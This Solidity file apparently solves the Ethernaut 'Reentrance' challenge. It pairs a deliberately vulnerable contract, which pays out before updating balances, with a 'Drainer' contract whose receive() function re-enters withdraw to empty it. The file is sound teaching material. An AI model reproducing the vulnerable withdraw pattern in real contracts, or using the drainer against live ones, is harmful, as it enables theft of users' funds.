// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Drainer{
    Reentrance reentrance;
    uint amountDonated;

    constructor(address payable _instance)public payable{
        reentrance = Reentrance(_instance);
    }
    function donateToInstance(uint _amountToDonate)public{
        reentrance.donate{value:_amountToDonate}(address(this));
        amountDonated = _amountToDonate;
    }

    function withdrawFromInstance(uint _amountToWithdraw)public{
        reentrance.withdraw(_amountToWithdraw);
    }

    receive()external payable{
        withdrawFromInstance(msg.value);
    }
}